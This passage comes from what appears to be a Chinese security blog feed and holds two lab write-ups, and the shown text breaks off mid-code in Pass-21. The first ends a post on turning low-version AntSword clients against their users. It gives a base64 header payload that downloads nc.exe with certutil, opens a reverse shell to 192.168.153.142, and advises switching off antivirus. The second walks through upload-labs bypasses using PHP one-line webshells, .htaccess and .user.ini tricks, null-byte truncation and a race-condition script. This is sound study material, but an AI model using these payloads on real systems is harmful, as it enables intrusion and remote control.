class="function">C:/<span class="title">windows</span>/<span class="title">win.ini</span></span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718160834056.png" alt="image-20240718160834056"></p><p>接下来使用Navicat连接Mysql蜜罐</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718161018075.png" alt="image-20240718161018075"></p><p>点击之后，我们发现我们的cmd上显示了如下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718161053450.png" alt="image-20240718161053450"></p><h2 id="反制蚁剑低版本"><a href="#反制蚁剑低版本" class="headerlink" title="反制蚁剑低版本"></a>反制蚁剑低版本</h2><p>我们首先在自己的虚拟机上搭建相关网站，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718181202374.png" alt="image-20240718181202374"></p><p>在网站根目录下写下一句话木马，命名为aaa.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">6</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试一句话木马是否生效，如下所示，输入<code>?6=phpinfo();</code>，出现如下页面则代表成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718162317750.png" alt="image-20240718162317750"></p><p>我们在主机上安装好我们的antsword漏洞版本，即版本号&lt;=2.0.7，我们用蚁剑进行连接，密码为6</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718163943856.png" alt="image-20240718163943856"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718164022561.png" alt="image-20240718164022561"></p><p>我们开始进行反制，将aaa.php中的代码换成如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 500 Not \&lt;img src=# onerror=&#x27;eval(new Buffer(`Y29uc3QgeyBleGVjIH0gPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyk7CmV4ZWMoJ2NhbGMnKTs=`,`base64`).toString())&#x27;&gt;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中base64编码部分为</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">const &#123; exec &#125; = require(&#x27;child_process&#x27;);</span><br><span class="line">exec(&#x27;calc&#x27;);</span><br></pre></td></tr></table></figure><p>即使计算机进行计算器进程，这串php即让计算机自动弹出计算器，实现任意代码执行</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718164654338.png" alt="image-20240718164654338"></p><p>通过双击蚁剑，我们可以执行计算机弹出的命令，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718164614067.png" alt="image-20240718164614067"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>我们首先将<code>nc.exe</code>放在我们搭建的网站下，我们在网站下再创建一个文件夹为<code>1111</code>，并把<code>nc.exe</code>放在该文件夹下，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718182926153.png" alt="image-20240718182926153"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718182949967.png" alt="image-20240718182949967"></p><p>我们在虚拟机上开启<code>nc</code>监听<code>8888</code>端口，执行命令<code>nc -lvp 8888</code>，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718165032409.png" alt="image-20240718165032409"></p><p>我们想要我们的主机主动出网，把控制权交给我们的虚拟机，就要想办法让我们的主机主动执行<code>nc -e cmd 192.168.153.142 8888</code>，把cmd权主动交给我们的虚拟机（192.168.153.142），当然首先我们要让我们的主机上也有<code>nc.exe</code>，即感染这个病毒文件，所以我们还需要让我们的主机自己访问<code>http://www.powdersnow.com/1111/nc.exe</code>文件，实现自动下载<code>nc.exe</code>文件到我们的主机上，所以我们要构造的payload为</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -<span class="built_in">split</span> -f http://www.powdersnow.com/1111/nc.exe &amp; nc -e cmd 192.168.153.142 8888</span><br></pre></td></tr></table></figure><p>  这就可以联想到我们的第二个实验了，下面是第二个实验的后门代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 500 Not \&lt;img src=# onerror=&#x27;eval(new Buffer(`Y29uc3QgeyBleGVjIH0gPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyk7CmV4ZWMoJ2NhbGMnKTs=`,`base64`).toString())&#x27;&gt;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将<code>Y29uc3QgeyBleGVjIH0gPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyk7CmV4ZWMoJ2NhbGMnKTs=</code>拿去base64解密，得到</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="keyword">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure><p>我们将<code>certutil -urlcache -split -f http://www.powdersnow.com/1111/nc.exe &amp; nc -e cmd 192.168.153.142 8888</code>替换<code>calc</code>，得到如下的payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="keyword">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;certutil -urlcache -split -f http://www.powdersnow.com/1111/nc.exe &amp; nc -e cmd 192.168.153.142 8888&#x27;</span>);</span><br></pre></td></tr></table></figure><p>拿去base64加密，替换原来的base64编码，得到payload如下，我们将payload重新放在aaa.php中，如下图所示，<strong>值得我们注意的是，由于<code>nc.exe</code>是病毒软件，所以我们要关闭我们的防火墙，退出杀毒软件，才能保证实验的成功</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 500 Not \&lt;img src=# onerror=&#x27;eval(new Buffer(`Y29uc3QgeyBleGVjIH0gPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyk7CmV4ZWMoJ2NlcnR1dGlsIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovL3d3dy5wb3dkZXJzbm93LmNvbS8xMTExL25jLmV4ZSAmIG5jIC1lIGNtZCAxOTIuMTY4LjE1My4xNDIgODg4OCcpOw==`,`base64`).toString())&#x27;&gt;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718184459060.png" alt="image-20240718184459060"></p><p>我们保存后再次访问我们的蚁剑，这个时候看我们的监听端口，可以发现已经getshell了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718184624905.png" alt="image-20240718184624905"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/acd7d1c5622e0f91b46aff2a80c962fc.png" alt="acd7d1c5622e0f91b46aff2a80c962fc"></p><p>成功反弹shell</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> 实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蜜罐 </tag>
            
            <tag> 反弹Shell </tag>
            
            <tag> 任意命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞靶场通关教程</title>
      <link href="/post/b1107f24.html"/>
      <url>/post/b1107f24.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我使用的是win7虚拟机+phpEnv搭建靶场环境，我们只需要将upload-labs的源码下载下来，并拖入到虚拟机对应的文件中，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717232925566.png" alt="image-20240717232925566"></p><p>并在网络配置下写入如下配置</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717233010756.png" alt="image-20240717233010756"></p><p>根目录选中源码目录，点击保存，最后在自己本机上的host文件中加上<code>xx.xx.xx.xx(虚拟机IP) upload.local</code>，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717233230725.png" alt="image-20240717233230725"></p><p>这样我们的本机就能成功的进行域名解析，我们就可以通过物理机上的浏览器进行访问虚拟机的网站</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717233327852.png" alt="image-20240717233327852"></p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>我们先上传一个php马，通过bp进行抓包，我们在脚本中写入<code>&lt;?php @eval($_POST[&#39;attack&#39;]);?&gt;</code>，保存为<code>attack.php</code>，进行上传</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717233819969.png" alt="image-20240717233819969"></p><p>发现bp并没有抓到包，所以可以判定是前端验证，我们打开开发者工具，我们可以发现js代码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717234036734.png" alt="image-20240717234036734"></p><p>我们直接禁用js，重新上传，我们可以发现成功上传，直接使用蚁剑连接，图像地址为<code>http://upload.local/upload/attack.php</code>，连接</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240717234509796.png" alt="image-20240717234509796"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>同样的，先上传attack.php，看看是什么限制，这一看就是后端检测了，我们用bp抓包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/e66f85742221e33008034716b6ec2c0e.png" alt="e66f85742221e33008034716b6ec2c0e"></p><p>将Content-Type改成png形式，发现上传成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/e66f85742221e33008034716b6ec2c0e.png" alt=""></p><p>最后蚁剑连接即可</p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>同样上传attack.php，用bp抓包重发，发现这里又有前端验证，我们这里先禁用js，再进行上传attack.php，但是好像不管用了，于是我F12去看了看源码，发现并不是前端验证，所以我们尝试着将attack.php改成attack.php.png，再试着进行上传</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718084221462.png" alt="image-20240718084221462"></p><p>发现可以成功上传，我们用bp拦截，再进行测试，我们发现他给我们的提示信息好像和以前不一样了（这里一定一定要细心）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718084604602.png" alt="image-20240718084604602"></p><p>这里是仅仅不允许上传这几个特定的后缀文件，而没说不能上传其他后缀的木马文件，比如phtml、php3、php5等等，我们这里试着改为phtml，看看能否上传成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718085029608.png" alt="image-20240718085029608"></p><p>成功上传，我们再用蚁剑连接即可，这里还要注意一点，上传后服务器会给我们重命名，我们只需要在网页中新建标签页打开图片就能找到正确路径</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718085822961.png" alt="image-20240718085822961"></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><h3 id="方法一-上传-htaccess"><a href="#方法一-上传-htaccess" class="headerlink" title="方法一 上传.htaccess"></a>方法一 上传.htaccess</h3><p>同样先上传一个任意木马文件，然后抓包进行测试，经过我们的测试，这里并没有过滤.htaccess文件，我们可以先上传一个.htaccess文件，让服务器可以将png文件解析为我们的php文件执行，.htaccess文件内容如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718092058840.png" alt="image-20240718092058840"></p><p>接着上传一句话木马，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718092243826.png" alt="image-20240718092243826"></p><p>蚁剑连接，这里要注意的是将phpEnv的中间件改为Apache，并修改如下地方</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718094221477.png" alt="image-20240718094221477"></p><h3 id="方法二-代码审计"><a href="#方法二-代码审计" class="headerlink" title="方法二 代码审计"></a>方法二 代码审计</h3><p>我们找到源代码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718095237070.png" alt="image-20240718095237070"></p><p>通过审计代码我们可以发现当我们上传<code>1.php. .</code>的时候可以绕过限制，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718095522453.png" alt="image-20240718095522453"></p><p>我们用蚁剑进行连接，成功连接上</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718095635544.png" alt="image-20240718095635544"></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>这里源代码没变，我们可以用第四关的方法二进行上传，这里不再加以赘述</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718100209596.png" alt="image-20240718100209596"></p><p>这里还有一种方式，就是上传<code>.user.ini</code>文件，<code>.user.ini</code>的意思是所有的php文件自动包含某个文件，其相当于一个用户自定义的<code>php.ini</code>文件，<code>php.ini</code>是 php的配置文件，<code>.user.ini</code>中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞，想要引发解析漏洞的三个条件为</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">服务器脚本语言为PHP  </span><br><span class="line">服务器使用CGI／FastCGI模式  </span><br><span class="line">上传目录下要有可执行的php文件</span><br></pre></td></tr></table></figure><p>我们将环境切换回nginx，在<code>.user.ini</code>中写入<code>auto_prepend_file=attack.png</code>，即把attack.png的东西全部包含在里面，我们上传两个文件，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718101443207.png" alt="image-20240718101443207"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718101535572.png" alt="image-20240718101535572"></p><p>此时我们去看看readme.php下有没有包含我们写的木马</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718103007897.png" alt="image-20240718103007897"></p><p>ok，本关成功上传</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>查看源码，基本上所有的后缀名都给禁用了，但是没有大小写转换函数，所以我们可以使用大小写转换来进行绕过</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718102515002.png" alt="image-20240718102515002"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718102552456.png" alt="image-20240718102552456"></p><p>蚁剑连接即可，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718102738605.png" alt="image-20240718102738605"></p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>查看源码，没有使用删除空格函数<code>trim</code>，所以我们可以使用空格绕过，即在文件末尾上传一个空格进入绕过</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718105451661.png" alt="image-20240718105451661"></p><p>上传成功，访问<code>/upload/202407181054425865.php</code>这个路径即可getshell</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718105551785.png" alt="image-20240718105551785"></p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>这一关没有用<code>$file_name = deldot($file_name);//删除文件名末尾的点</code>函数来删除后面的点，所以我们考虑使用点绕过</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718110058798.png" alt="image-20240718110058798"></p><p>成功绕过，地址为<code>/upload/attack.php</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718110619115.png" alt="image-20240718110619115"></p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>这一关删除了函数<code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code>，我们可以用字符串<code>::$DATA</code>进行绕过</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">补充知识：php在window的时候如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持&quot;::$DATA&quot;之前的文件名 他的目的就是不检查后缀名。</span><br></pre></td></tr></table></figure><p>所以我们可以尝试进行文件流转化，成功上传</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718111350817.png" alt="image-20240718111350817"></p><p>路径如下<code>/upload/202407181113425867.php</code>，蚁剑访问</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718111705105.png" alt="image-20240718111705105"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>这一关使用<code>. .</code>进行绕过，这里我们补充一个知识，也能解释前面为什么使用<code>. .</code>绕过可以成功</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">补充知识：deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来</span><br></pre></td></tr></table></figure><p>所以这就是为什么中间要加一个空格，<code>attack.php. .</code>经过过滤后会变成<code>attack.php.</code>，可以成功绕过对文件后缀名的限制</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718123958137.png" alt="image-20240718123958137"></p><p>路径为<code>/upload/attack.php.</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718124327772.png" alt="image-20240718124327772"></p><p>成功连接，getshell</p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>经过抓包测试，发现使用双写绕过可以实现绕过</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718125112201.png" alt="image-20240718125112201"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718125130862.png" alt="image-20240718125130862"></p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>这题要用到的知识点是00截断，主要针对的是白名单检测，在php&lt;5.3.4的版本中，存储文件时处理文件名的函数认为0x00是终止符，于是在函数读到0x00时，会认为文件已经结束</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">例如：我们上传 1.php%00.jpg 时，首先后缀名是合法的jpg格式，可以绕过前端的检测。上传到后端后，后端判断文件名后缀的函数会认为其是一个.jpg格式的文件，可以躲过白名单检测。但是在保存文件时，保存文件时处理文件名的函数在遇到%00字符认为这是终止符，于是丢弃后面的 .jpg，于是我们上传的 1.php%00.jpg 文件最终会被写入 1.php 文件中并存储在服务端。</span><br></pre></td></tr></table></figure><p>由于我的靶场环境版本高于5.3.4，所以这里不演示操作成功界面，只演示操作步骤，修改下面两个地方即可（针对GET型00截断，GET说的是其save_path是get传参的</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718133757313.png" alt="image-20240718133757313"></p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>这一关仍然是00截断，但是是POST传参，我们进行如下操作</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718134235213.png" alt="image-20240718134235213"></p><p>这里并不是没进行00截断，而是提前对<code>%00</code>进行了url解码，因为post不会像get那样提前对<code>%00</code>进行解码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718134429973.png" alt="image-20240718134429973"></p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>第十四关让我们上传图片马到服务器，也就是说肯定会检测是不是真的为图片，而不是仅仅检测后缀名，这个时候我们就需要用到<code>GIF89a</code>进行伪造图片，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718134922317.png" alt="image-20240718134922317"></p><p>路径为<code>/upload/8420240718134909.gif</code>，我们采用文件包含的模式将这个gif文件包含进代码中，以当作php文件进行执行</p><p>所以我们的蚁剑连接路径为<code>http://upload.local/include.php?file=upload/8420240718134909.gif</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718135252172.png" alt="image-20240718135252172"></p><p>连接成功</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>我们按照同样的方式进行操作</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718135610968.png" alt="image-20240718135610968"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718135649657.png" alt="image-20240718135649657"></p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>继续上述操作</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718135949298.png" alt="image-20240718135949298"></p><p>路径为<code>/upload/4920240718135933.gif</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718140036263.png" alt="image-20240718140036263"></p><p>成功</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>继续使用刚刚的方法</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718140558848.png" alt="image-20240718140558848"></p><p>发现不行了，猜测可能是检测了Content-type，我们试着把Content-Type改了，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718141109740.png" alt="image-20240718141109740"></p><p>发现还是不太行，后来看了别人的解法才知道是二次渲染，我们拿大佬的gif进行上传，链接放这里了：<a href="https://wwe.lanzoui.com/iFSwwn53jaf">文件上传之二次渲染(专用图).zip - 蓝奏云 (lanzoui.com)</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718142557257.png" alt="image-20240718142557257"></p><p>这张图片的特点就是我们这里看是乱码，但是经过上传到服务器解析后得到的是一个可以打开的gif文件，对应的地址为<code>/upload/31946.gif</code></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>这一关的提示就是让我们去代码审计，那我们先去审计代码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718143541759.png" alt="image-20240718143541759"></p><p>代码告诉我们我们上传的文件首先会进行白名单检测，如果属于gif、png、jpg中的一种，服务器就会对其重命名，否则就会删除，我们这个时候就可以使用条件竞争的方式，让服务器一直在上传和删除，最后总能上传成功</p><p>我们将拦截到的包送入爆破模式</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718144323518.png" alt="image-20240718144323518"></p><p>我们设置无限空发payload</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718144447454.png" alt="image-20240718144447454"></p><p>我们把线程数调大一点</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718144814430.png" alt="image-20240718144814430"></p><p>同时我们写一个脚本来判断什么时候成功上传了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://xxx.xxx.xxx.xxx/upload-labs/upload/attack.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>然后我们开始条件竞争攻击，最后发现我们的目录下有attack.php，最后用蚁剑连接即可</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>同样是条件竞争，只不过是图片马形式的条件竞争，我们按照第18关的方法一样进行设置即可，同时记得给数据加上<code>GIF89a</code>头，同时使用文件包含的方式进行访问，这些在前面已经讲过，这里不再赘述</p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>这一题我们首先查看源码，源码如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718201643744.png" alt="image-20240718201643744"></p><p>显然这里既有白名单验证，又有黑名单验证，黑名单基本把所有后缀名给过滤了，但是有一个函数值得注意一下，就是<code>move_uploaded_file</code>函数，就是会忽略末尾的<code>/.</code>，使得我们可以用<code>php/.</code>绕过对php的限制，因为它并不是php后缀，所以我们可以用以下的手法来进行绕过</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718210651956.png" alt="image-20240718210651956"></p><p>路径为<code>http://upload.local/upload/upload-19.php/.</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240718210956126.png" alt="image-20240718210956126"></p><h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2><p>首先我们对源代码进行分析，源代码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span 